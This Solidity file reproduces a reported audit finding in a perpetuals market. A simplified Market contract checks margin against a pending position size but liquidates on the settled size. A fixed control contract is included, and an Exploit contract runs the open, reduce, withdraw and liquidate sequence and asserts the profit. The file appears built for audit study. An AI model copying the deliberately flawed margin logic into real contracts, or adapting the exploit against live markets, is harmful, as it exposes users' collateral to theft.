// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Perennial V2 — InvariantLib margin check (Sherlock 2025-01, H-2).
    A normal update margins the pending current position. Liquidation
    checks the latest settled position. Price is 1_000, margin 1.2%,
    maintenance 1%. A user at size 10 with 200 collateral cuts to 5,
    pays a 15 trading fee, and withdraws 95. 90 collateral is healthy
    on size 5 (1.8%) and liquidatable on size 10 (0.9%). The liquidator
    takes 15. The control margins the latest size and the withdrawal reverts. */

contract DSU {
    string public symbol = "DSU";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Actor {
    function approve(DSU token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }

    function call(address to, bytes calldata data) external returns (bytes memory) {
        (bool ok, bytes memory ret) = to.call(data);
        require(ok, "actor");
        return ret;
    }
}

contract Market {
    uint256 public constant PRICE = 1000 ether;
    uint256 public constant MARGIN = 12e15;
    uint256 public constant MAINTENANCE = 10e15;
    DSU public dsu;

    struct Pos {
        uint256 latest;
        uint256 current;
        uint256 collateral;
        bool pending;
    }

    mapping(address => Pos) public positions;

    constructor(DSU _dsu) {
        dsu = _dsu;
    }

    function notional(uint256 magnitude) public pure returns (uint256) {
        return magnitude * PRICE / 1 ether;
    }

    function ratio(uint256 magnitude, uint256 collateral) public pure returns (uint256) {
        if (magnitude == 0) return type(uint256).max;
        return collateral * 1 ether / notional(magnitude);
    }

    function margined(uint256 magnitude, uint256 collateral) public pure returns (bool) {
        return ratio(magnitude, collateral) >= MARGIN;
    }

    function maintained(uint256 magnitude, uint256 collateral) public pure returns (bool) {
        return ratio(magnitude, collateral) >= MAINTENANCE;
    }

    function openSettled(uint256 size, uint256 collateral) external {
        require(dsu.transferFrom(msg.sender, address(this), collateral), "pull");
        positions[msg.sender] = Pos(size, size, collateral, false);
    }

    function update(uint256 newSize, int256 collateralDelta) external {
        Pos storage p = positions[msg.sender];
        uint256 coll = p.collateral;
        uint256 oldSize = p.pending ? p.current : p.latest;
        uint256 delta = newSize > oldSize ? newSize - oldSize : oldSize - newSize;
        uint256 fee = notional(delta) * 3 / 1000;
        coll -= fee;
        if (collateralDelta < 0) {
            uint256 withdrawAmount = uint256(-collateralDelta);
            coll -= withdrawAmount;
            require(dsu.transfer(msg.sender, withdrawAmount), "withdraw");
        }
        require(margined(newSize, coll), "margin");
        // @> VULN: margin used the pending size, so the reduced position is stored and the settled size stays liquidatable
        p.current = newSize;
        p.collateral = coll;
        p.pending = true;
    }

    function liquidate(address account) external returns (uint256 reward) {
        Pos storage p = positions[account];
        require(!maintained(p.latest, p.collateral), "healthy");
        reward = 15 ether;
        p.collateral -= reward;
        p.latest = 0;
        p.current = 0;
        p.pending = false;
        require(dsu.transfer(msg.sender, reward), "reward");
    }
}

contract MarketFixed {
    uint256 public constant PRICE = 1000 ether;
    uint256 public constant MARGIN = 12e15;
    DSU public dsu;
    mapping(address => uint256) public latest;
    mapping(address => uint256) public collateralOf;

    constructor(DSU _dsu) {
        dsu = _dsu;
    }

    function openSettled(uint256 size, uint256 collateral) external {
        require(dsu.transferFrom(msg.sender, address(this), collateral), "pull");
        latest[msg.sender] = size;
        collateralOf[msg.sender] = collateral;
    }

    function update(uint256 newSize, int256 collateralDelta) external {
        uint256 coll = collateralOf[msg.sender];
        uint256 oldSize = latest[msg.sender];
        uint256 delta = newSize > oldSize ? newSize - oldSize : oldSize - newSize;
        uint256 fee = (delta * PRICE / 1 ether) * 3 / 1000;
        coll -= fee;
        if (collateralDelta < 0) {
            uint256 withdrawAmount = uint256(-collateralDelta);
            coll -= withdrawAmount;
            require(dsu.transfer(msg.sender, withdrawAmount), "withdraw");
        }
        uint256 checkSize = oldSize > newSize ? oldSize : newSize;
        uint256 ratio = coll * 1 ether / (checkSize * PRICE / 1 ether);
        require(ratio >= MARGIN, "margin");
        latest[msg.sender] = newSize;
        collateralOf[msg.sender] = coll;
    }
}

contract Exploit {
    DSU public dsu;
    Market public market;
    Actor public user;
    uint256 public reward;
    uint256 public collateralAfter;
    bool public healthyOnPending;
    bool public liquidatableOnLatest;

    constructor() {
        dsu = new DSU();
        market = new Market(dsu);
        user = new Actor();
    }

    function run() external {
        dsu.mint(address(user), 200 ether);
        user.approve(dsu, address(market), 200 ether);
        user.call(address(market), abi.encodeWithSignature("openSettled(uint256,uint256)", 10 ether, 200 ether));
        healthyOnPending = market.margined(5 ether, 90 ether);
        liquidatableOnLatest = !market.maintained(10 ether, 90 ether);
        user.call(address(market), abi.encodeWithSignature("update(uint256,int256)", 5 ether, -int256(95 ether)));
        (uint256 latest, uint256 current, uint256 collateral, bool pending) = market.positions(address(user));
        require(latest == 10 ether && current == 5 ether && pending, "pending");
        require(collateral == 90 ether, "left");
        reward = market.liquidate(address(user));
        collateralAfter = _collateral();
        require(healthyOnPending, "healthy");
        require(liquidatableOnLatest, "liq");
        require(reward == 15 ether, "reward");
        require(dsu.balanceOf(address(this)) == 15 ether, "paid");
        require(collateralAfter == 75 ether, "after");
        require(dsu.balanceOf(address(user)) == 95 ether, "withdrew");
    }

    function _collateral() internal view returns (uint256 collateral) {
        (, , collateral, ) = market.positions(address(user));
    }
}
